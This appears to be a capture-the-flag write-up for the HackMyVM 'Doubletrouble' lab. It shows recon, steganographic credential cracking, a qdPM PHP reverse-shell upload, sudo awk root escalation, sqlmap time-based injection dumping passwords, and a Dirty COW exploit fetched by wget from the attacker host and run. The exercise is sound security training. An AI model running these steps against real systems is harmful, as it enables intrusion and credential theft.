---
layout: post
title: "HackMyVM - Doubletrouble"
date: 2021-09-16 18:00:00 +0100
categories: hmv
tag: ["RCE", "qdPM"]
---

Creator: [tasiyanci](https://hackmyvm.eu/profile/?user=tasiyanci)
Level: Easy
Release Date: 2021-09-14

## Scan

```bash
nmap -sC -sV -p- 192.168.1.11
```

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-16 23:03 WEST
Nmap scan report for 192.168.1.11
Host is up (0.0098s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: qdPM | Login
|_http-server-header: Apache/2.4.38 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.88 seconds
```

## Enumeration

### DirSearch

```bash
dirsearch -u http://192.168.1.11 -e /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 404,403
```

```bash
  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | HTTP method: GET | Threads: 30 | Wordlist size: 9009

Target: http://192.168.1.11/

[23:05:14] Starting: 
[23:05:29] 301 -  314B  - /backups  ->  http://192.168.1.11/backups/        
[23:05:29] 200 -  743B  - /backups/                                         
[23:05:31] 200 -    0B  - /check.php                                        
[23:05:33] 301 -  311B  - /core  ->  http://192.168.1.11/core/              
[23:05:33] 301 -  310B  - /css  ->  http://192.168.1.11/css/                
[23:05:37] 200 -  894B  - /favicon.ico                                      
[23:05:39] 200 -    2KB - /images/                                          
[23:05:39] 301 -  313B  - /images  ->  http://192.168.1.11/images/          
[23:05:40] 200 -    6KB - /index.php                                        
[23:05:40] 200 -    7KB - /index.php/login/                                 
[23:05:40] 301 -  314B  - /install  ->  http://192.168.1.11/install/        
[23:05:40] 200 -    2KB - /install/index.php?upgrade/                       
[23:05:40] 200 -    2KB - /install/                                         
[23:05:41] 200 -    2KB - /js/                                              
[23:05:41] 301 -  309B  - /js  ->  http://192.168.1.11/js/                  
[23:05:53] 200 -  470B  - /readme.txt                                       
[23:05:53] 200 -   26B  - /robots.txt                                       
[23:05:54] 301 -  313B  - /secret  ->  http://192.168.1.11/secret/          
[23:05:54] 200 -  955B  - /secret/                                          
[23:05:59] 200 -    2KB - /template/                                        
[23:05:59] 301 -  315B  - /template  ->  http://192.168.1.11/template/
[23:06:01] 200 -    1KB - /uploads/                                         
[23:06:01] 301 -  314B  - /uploads  ->  http://192.168.1.11/uploads/        
                                                                             
Task Completed
```

### doubletrouble.jpg

```bash
stegseek --crack doubletrouble.jpg /usr/share/wordlists/rockyou.txt -xf output.txt
```

```bash
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "92camaro"       
[i] Original filename: "creds.txt".
[i] Extracting to "output.txt".

$ cat output.txt                         
otisrush@localhost.com
otis666                                                                                                                                                                      
```

* http://192.168.1.11/index.php/
* User : otisrush@localhost.com
* PW : otis666

## [qdPM 9.1 - Remote Code Execution](https://www.exploit-db.com/exploits/47954)

* Upload web shell to avatar profile picture

http://192.168.1.11/uploads/users/905066-php-reverse-shell.php

```bash
$ nc -lvnp 9000             
listening on [any] 9000 ...
connect to [192.168.1.6] from (UNKNOWN) [192.168.1.11] 44540
Linux doubletrouble 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64 GNU/Linux
 17:57:47 up 58 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
```

* Stable Shell

```python
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
CTRL+Z  
stty raw -echo; fg  
2xENTER
```


## Vertical Movement (www-data > root) - [awk](https://gtfobins.github.io/gtfobins/awk/#sudo)

```bash
www-data@doubletrouble:/$ sudo -l
Matching Defaults entries for www-data on doubletrouble:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on doubletrouble:
    (ALL : ALL) NOPASSWD: /usr/bin/awk

```

```bash
www-data@doubletrouble:/$ sudo awk 'BEGIN {system("/bin/sh")}'
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```

### Get 2nd OVA

```bash
root@doubletrouble:~# ls -la
total 403472
drwx------  2 root root      4096 Sep 11  2021 .
drwxr-xr-x 18 root root      4096 Dec 17  2020 ..
-rw-------  1 root root       104 Apr 22 18:04 .bash_history
-rw-r--r--  1 root root 413142528 Sep 11  2021 doubletrouble.ova
root@doubletrouble:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
doubletrouble.ova192.168.1.6 - - [16/Sep/2021 18:07:16] "GET /doubletrouble.ova HTTP/1.1" 200 -
```

## Scan & Enumeration (2nd box)

### NMAP

```bash
$ nmap -sC -sV -p- 192.168.1.12
Starting Nmap 7.92 ( https://nmap.org ) at 2021-09-16 00:12 WEST
Nmap scan report for 192.168.1.12
Host is up (0.00027s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 e8:4f:84:fc:7a:20:37:8b:2b:f3:14:a9:54:9e:b7:0f (DSA)
|   2048 0c:10:50:f5:a2:d8:74:f1:94:c5:60:d7:1a:78:a4:e6 (RSA)
|_  256 05:03:95:76:0c:7f:ac:db:b2:99:13:7e:9c:26:ca:d1 (ECDSA)
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.2.22 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.91 seconds
```

### DirSearch

```bash
$ dirsearch -u http://192.168.1.12 -e /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x 404,403

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt | HTTP method: GET | Threads: 30 | Wordlist size: 9009

Target: http://192.168.1.12/

[00:15:38] Starting: 
[00:16:03] 200 -  615B  - /index.php                                        
[00:16:03] 200 -  615B  - /index.php/login/                                 
                                                                             
Task Completed                                                                                                                                                         
```

## Lateral Movement (doubletrouble > clapton) 

```bash
$ sqlmap -u http://192.168.1.12/index.php --forms --current-db -D doubletrouble -T users --dump
```

```txt
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.6.3#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 00:22:22 /2021-09-16/

[00:22:23] [INFO] testing connection to the target URL
[00:22:23] [INFO] searching for forms
[1/1] Form:
POST http://192.168.1.12/index.php
POST data: uname=&psw=&btnLogin=Login
do you want to test this form? [Y/n/q] 
> 
Edit POST data [default: uname=&psw=&btnLogin=Login] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] 
[00:22:28] [INFO] using '/home/adok/.local/share/sqlmap/output/results-04232022_1222am.csv' as the CSV results file in multiple targets mode
[00:22:28] [INFO] checking if the target is protected by some kind of WAF/IPS
[00:22:28] [INFO] testing if the target URL content is stable
[00:22:29] [INFO] target URL content is stable
[00:22:29] [INFO] testing if POST parameter 'uname' is dynamic
[00:22:29] [WARNING] POST parameter 'uname' does not appear to be dynamic
[00:22:29] [WARNING] heuristic (basic) test shows that POST parameter 'uname' might not be injectable
[00:22:29] [INFO] testing for SQL injection on POST parameter 'uname'
[00:22:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[00:22:29] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[00:22:29] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[00:22:29] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[00:22:29] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[00:22:29] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[00:22:29] [INFO] testing 'Generic inline queries'
[00:22:29] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[00:22:29] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[00:22:29] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[00:22:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[00:22:39] [INFO] POST parameter 'uname' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[00:22:45] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[00:22:45] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[00:22:46] [INFO] checking if the injection point on POST parameter 'uname' is a false positive
POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 72 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=aXdz' AND (SELECT 8984 FROM (SELECT(SLEEP(5)))atJv) AND 'rRBP'='rRBP&psw=&btnLogin=Login
---
do you want to exploit this SQL injection? [Y/n] 
[00:23:11] [INFO] the back-end DBMS is MySQL
[00:23:11] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Debian 7 (wheezy)
web application technology: PHP 5.5.38, Apache 2.2.22
back-end DBMS: MySQL >= 5.0.12
[00:23:11] [INFO] fetching current database
[00:23:11] [INFO] retrieved: 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
[00:23:28] [INFO] adjusting time delay to 1 second due to good response times
doubletrouble
current database: 'doubletrouble'
[00:24:07] [INFO] fetching columns for table 'users' in database 'doubletrouble'
[00:24:07] [INFO] retrieved: 2
[00:24:09] [INFO] retrieved: username
[00:24:31] [INFO] retrieved: password
[00:24:59] [INFO] fetching entries for table 'users' in database 'doubletrouble'
[00:24:59] [INFO] fetching number of entries for table 'users' in database 'doubletrouble'
[00:24:59] [INFO] retrieved: 2
[00:25:01] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)                               
GfsZxc1
[00:25:27] [INFO] retrieved: montreux
[00:25:56] [INFO] retrieved: ZubZub99
[00:26:28] [INFO] retrieved: clapton
Database: doubletrouble
Table: users
[2 entries]
+----------+----------+
| password | username |
+----------+----------+
| GfsZxc1  | montreux |
| ZubZub99 | clapton  |
+----------+----------+

[00:26:54] [INFO] table 'doubletrouble.users' dumped to CSV file '/home/adok/.local/share/sqlmap/output/192.168.1.12/dump/doubletrouble/users.csv'
[00:26:54] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/adok/.local/share/sqlmap/output/results-04232022_1222am.csv'

[*] ending @ 00:26:54 /2021-09-16/
```

### SSH

```bash
$ ssh clapton@192.168.1.12                                                                     
Linux doubletrouble 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64

clapton@doubletrouble:~$ ls
user.txt
```

### LinPEAS

* Kernel Exploit

```bash
[+] [CVE-2016-5195] dirtycow                                                                                                                                           

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: [ debian=7|8 ],RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: [ debian=7|8 ],RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
```

## Root

```bash
$ wget http://192.168.1.6:9000/dirty.c
--2022-04-22 18:41:10--  http://192.168.1.6:9000/dirty.c
Connecting to 192.168.1.6:9000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4815 (4.7K) [text/x-csrc]
Saving to: `dirty.c'

100%[=============================================================================================================================>] 4,815       --.-K/s   in 0s      

2021-09-16 18:41:10 (12.6 MB/s) - `dirty.c' saved [4815/4815]

clapton@doubletrouble:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
clapton@doubletrouble:/tmp$ ./dirty root
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: root
Complete line:
firefart:fiw.I6FqpfXW.:0:0:pwned:/root:/bin/bash

mmap: 7f61ba00e000
^C
clapton@doubletrouble:/tmp$
```

```bash 
ssh firefart@192.168.1.12
firefart@192.168.1.12's password: 
Linux doubletrouble 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64
firefart@doubletrouble:~# id
uid=0(firefart) gid=0(root) groups=0(root)
firefart@doubletrouble:~# 
```
